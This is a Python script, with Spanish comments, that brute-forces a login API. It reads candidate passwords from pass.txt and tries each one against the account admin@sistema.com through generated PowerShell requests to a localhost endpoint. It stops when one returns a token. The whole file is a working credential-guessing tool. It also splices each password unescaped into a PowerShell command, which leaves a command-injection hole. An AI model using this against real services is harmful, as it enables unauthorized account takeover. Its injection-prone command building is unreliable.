import subprocess
import json
import sys

def probar_login(email, password):
    """
    Intenta hacer login con el email y password dados
    Retorna True si el login es exitoso, False en caso contrario
    """
    # Script de PowerShell como string
    powershell_script = f'''
try {{
    $body = @{{
        email = "{email}"
        password = "{password}"
    }} | ConvertTo-Json

    $headers = @{{
        "Content-Type" = "application/json"
    }}

    $response = Invoke-RestMethod -Uri "http://localhost:54055/api/auth/login" `
                                -Method POST `
                                -Headers $headers `
                                -Body $body

    Write-Host "✅ Login exitoso con password: {password}" -ForegroundColor Green
    Write-Host "Respuesta del servidor:" -ForegroundColor Yellow
    $response | ConvertTo-Json
    
    if ($response.token) {{
        Write-Host "Token: $($response.token)" -ForegroundColor Cyan
    }}
    
    exit 0

}} catch {{
    Write-Host "❌ Fallo con password: {password}" -ForegroundColor Red
    exit 1
}}
'''
    
    try:
        # Ejecutar el script de PowerShell
        result = subprocess.run(
            ["powershell", "-Command", powershell_script],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        # Imprimir la salida
        if result.stdout:
            print(result.stdout)
        
        # Retornar True si el código de salida es 0 (éxito)
        return result.returncode == 0
        
    except subprocess.TimeoutExpired:
        print(f"⏱️  Timeout al probar password: {password}")
        return False
    except Exception as e:
        print(f"❌ Error al ejecutar comando: {e}")
        return False

def main():
    email = "admin@sistema.com"
    archivo_passwords = "pass.txt"
    
    print("=" * 60)
    print("🔐 INICIANDO PRUEBA DE CONTRASEÑAS")
    print("=" * 60)
    print(f"Email objetivo: {email}")
    print(f"Archivo de contraseñas: {archivo_passwords}")
    print("=" * 60)
    
    try:
        # Leer el archivo de contraseñas
        with open(archivo_passwords, 'r', encoding='utf-8') as file:
            passwords = [line.strip() for line in file if line.strip()]
        
        if not passwords:
            print("❌ El archivo pass.txt está vacío")
            return
        
        print(f"📝 Se encontraron {len(passwords)} contraseñas para probar\n")
        
        # Probar cada contraseña
        for i, password in enumerate(passwords, 1):
            print(f"\n[{i}/{len(passwords)}] Probando: {password}")
            print("-" * 60)
            
            if probar_login(email, password):
                print("\n" + "=" * 60)
                print("🎉 ¡CONTRASEÑA ENCONTRADA!")
                print(f"✅ Password correcto: {password}")
                print("=" * 60)
                break
        else:
            print("\n" + "=" * 60)
            print("❌ Ninguna contraseña funcionó")
            print("=" * 60)
    
    except FileNotFoundError:
        print(f"❌ Error: No se encontró el archivo '{archivo_passwords}'")
        print("💡 Crea un archivo 'pass.txt' con una contraseña por línea")
    except Exception as e:
        print(f"❌ Error inesperado: {e}")

if __name__ == "__main__":
    main()